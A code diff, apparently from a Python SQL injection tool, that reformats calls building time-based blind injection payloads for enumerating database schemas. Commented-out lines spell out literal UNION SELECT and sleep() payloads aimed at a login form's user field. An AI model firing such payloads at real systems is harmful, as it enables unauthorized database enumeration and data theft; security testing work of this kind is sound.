@@ -332,7 +332,8 @@ class SqliDatabases(SqliTest):
                     # payload = {
                     #     "user": "admi' union SELECT 1,if((SELECT COUNT(SCHEMA_NAME) from information_schema.SCHEMATA limit 0,1) > " + repr(
                     #         i) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
-                    payload = self.dealpayload.construct_time_payload(select="COUNT(SCHEMA_NAME)", source="information_schema.SCHEMATA", compare=i)
+                    payload = self.dealpayload.construct_time_payload(select="COUNT(SCHEMA_NAME)",
+                                                                      source="information_schema.SCHEMATA", compare=i)
                     if self.Data.PostTimeData(payload, self.time) == 0:
                         databases_number = i
                         break
@@ -349,9 +350,9 @@ class SqliDatabases(SqliTest):
                         #     "user": "admi' union SELECT 1,if((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
                         #         i) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
                         payload = self.dealpayload.construct_time_payload(select="length(SCHEMA_NAME)",
-                                                                           source="information_schema.SCHEMATA",
-                                                                           limit=i,
-                                                                           compare=j)
+                                                                          source="information_schema.SCHEMATA",
+                                                                          limit=i,
+                                                                          compare=j)
                         if self.Data.PostTimeData(payload, self.time) == 0:
                             databases_name_len = j
                             break
